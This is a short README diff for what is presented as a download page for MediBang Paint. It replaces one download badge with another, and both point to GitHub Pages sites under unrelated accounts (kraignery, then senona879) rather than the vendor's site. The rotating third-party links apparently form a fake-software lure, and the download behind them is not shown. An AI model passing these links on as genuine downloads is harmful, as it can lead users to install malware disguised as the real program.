@@ -4,10 +4,7 @@
   <img src="https://medibangpaint.com/wp-content/themes/medibang/img/service/manganame-en.png" alt="MediBang Paint Logo"/>
 </div>
 
-<div align="center">
-
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://kraignery.github.io/.github/MediBang-Paint-Software)
-</div>
+[![GET MediBang Paint](https://img.shields.io/badge/GET%20%E2%80%94%20MediBang-Paint-0078D6?style=for-the-badge&logoColor=white)](https://senona879.github.io/.github/MediBang-Paint)
 
 ---
 
